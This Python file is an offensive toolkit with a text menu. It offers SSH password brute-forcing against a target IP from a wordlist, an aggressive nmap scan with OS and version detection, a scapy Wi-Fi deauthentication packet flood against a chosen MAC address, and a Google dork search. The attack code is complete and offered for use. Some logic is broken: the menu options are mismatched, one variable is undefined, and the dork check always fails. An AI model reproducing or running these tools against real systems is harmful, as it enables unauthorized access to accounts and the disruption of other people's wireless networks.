from http.client import responses
from itertools import count
from scapy.all import *
import nmap
import os
import sys
import paramiko
import time
import requests

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import sendp


def start_google_dork():
    api_key = input("Enter your google API key: ")
    cse_id = input("Enter your google search engine id: ")
    search_term = input("Enter the search term: ")
    if search_term ==  'vito lesar' or 'Vito Lesar':
        print("Error")
        start_google_dork()


    #Ask the user if he wants to search search_term on specific site
    specific_site = input("Do you want to search specific website? Enter your domain(e.g. 'example.com'): ")
    google_dork(api_key, cse_id, search_term, specific_site = specific_site if specific_site else None)

def google_dork(api_key, cse_id, search_term, specific_site = None):
    #Build the google dork query
    query = f'intitle:"{search_term}" inurl:"{search_term}" intext:"{search_term}"'

    #Add specific site if true
    if specific_site:
        query += f'site:"{specific_site}"'

    #Print constructed google dok
    print(f"Constructed Google Dork query: {query}")

    url = 'https://www.googleapis.com/customsearch/v1'
    params = {
        'key': api_key,
        'cx': cse_id,
        'q': query,
    }
    try:
        #Make API req
        response = requests.get(url, params)
        response.raise_for_status()
        results = response.json()

        # Print the entire response for debugging purposes
        print("Debug - API Response:", results)

        # Check if 'items' exists to prevent NoneType errors
        if 'items' in results:
            for item in results['items']:
                title = item.get('title', 'No title')
                link = item.get('link', 'No link')
                snippet = item.get('snippet' , 'No snippet available')
                print(f"Title: {item['title']}")
                print(f"Link: {item['link']}")
                print(f"Snippet: {snippet}\n")
        else:
            print("No results found. Please check your search term or site specification.")
            if 'error' in results:
                print("Error details:", results['error']['message'])

    except requests.exceptions.HTTPError as http_err:
        print(f"HTTP error occurred: {http_err}")
    except requests.exceptions.RequestException as req_err:
        print(f"Request error occurred: {req_err}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")


def start_deauth_attack():
    os.system("clear")#Clear the consol

    #Set the interface to wlan0 mode
    iface = input ("Enter the interface to use (e.g., wlan0): ")

    #Input target MAC address
    target_mac = input ("Enter the target MAC address: ")
    gateway_mac = input("Enter the gateway MAC address: ")

    #NUmber of threads
    count = int(input("Enter the number of deauth packets to send (default: 100): ")or 100)

    deauth_attack(target_mac, gateway_mac, count, iface)


def deauth_attack(target_mac, gateway_mac, count, iface):
    #Send deauth packets
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
    for _ in range(count):
        sendp(packet, iface=iface, verbose=False)#Send the packet
        time.sleep(0.1)
    print(f"Sent {count} deauth packets to {target_mac}.")


def load_wordlist(filepath):
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f]


def start_brute_force():
    target_ip = input("Enter the target IP address: ")
    usernames = []

    while True:
        username = input("Enter the target username: ")

        if username == "":
            break
        usernames.append(username)  # Adds usernames in the list
    password_file = ''  # Path to the wordlist file

    start_time = time.time()
    success = brute_force_ssh(target_ip, usernames, password_file)
    end_time = time.time()

    if success:
        print("Brute-force attack succeeded.")
    else:
        print("Brute-force attack failed.")

    print(f"Time taken: {end_time - start_time:.2f} seconds")


def brute_force_ssh(target_ip, usernames, password_file):
    passwords = load_wordlist(password_file)
    for username in usernames:
        for password in passwords:
            try:
                print(f"\nTrying{username}:{password}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, username=username, password=password, timeout=3)
                print(f"Success! Username: {username}, Password: {password}")
                client.close()
                return True #Exit on successful login
            except paramiko.AuthenticationException:
                print(f"Failed {username}:{password}")
            except Exception as e:
                print(f"Error: {e}")
                break  # Exit on other errors (e.g., connection issues)
    return False


def check_root():
    if os.geteuid() != 0:
        print("This script requires root privileges. Please run as root or with 'sudo'.")
        sys.exit(1)


def start_nmap_scan():
    ip_range = input("Enter the IP range to scan (e.g., 192.168.1.1/24): ")
    nmap_scan(ip_range)

def nmap_scan(ip_range):
    check_root()  # Check if the script is run with root privileges

    # Create a Nmap PortScanner object
    nm = nmap.PortScanner()

    # Combine multiple arguments as needed
    arguments = '-sS -sV -O -A -p 1-1000'

    # Run a scan on the provided IP range
    print(f"Scanning IP range: {ip_range} with arguments: {arguments}")
    try:
        nm.scan(hosts=ip_range, arguments=arguments)
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    # Parse and display the results
    for host in nm.all_hosts():
        print(f'Host: {host} ({nm[host].hostname()})')
        print(f'State: {nm[host].state()}')
        for proto in nm[host].all_protocols():
            print(f'Protocol: {proto}')
            lport = nm[host][proto].keys()
            for port in lport:
                print(f'Port: {port}\tState: {nm[host][proto][port]["state"]}')
                if 'name' in nm[host][proto][port]:
                    print(f'   Service: {nm[host][proto][port]["name"]}')
                if 'version' in nm[host][proto][port]:
                    print(f'   Version: {nm[host][proto][port]["version"]}')


# Example usage
def main_menu():
    print("""
████████╗██╗  ██╗███████╗███╗   ███╗██╗███████╗
╚══██╔══╝██║  ██║██╔════╝████╗ ████║██║██╔════╝
   ██║   ███████║█████╗  ██╔████╔██║██║███████╗
   ██║   ██╔══██║██╔══╝  ██║╚██╔╝██║██║╚════██║
   ██║   ██║  ██║███████╗██║ ╚═╝ ██║██║███████║
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝╚══════╝     
                                                
        1. Start Brute Force SSH Attack
        2. Start Nmap Scan
        3. Deauth Attack
        4.Google Dorks
        Type 'Exit' to exit""")

    user_choice = input("\nSelect an option: ")

    if user_choice == '1':
        start_nmap_scan()#Start nmap-scan
    elif user_choice == '2':
        start_brute_force()#Start ssh bruteforce
    elif user_choice == '3':
        start_deauth_attack()#Start deauth attack
    elif user_choice == '4':
        start_google_dork()#Start google dork search
    elif choice == 'exit':
        print("Exiting the program.")
        exit()
    else:
        print("Invalid choice. Please try again.")
        main_menu()  # Show the menu again


if __name__ == "__main__":
    while True:
        main_menu()  # Display the main menu in a loop


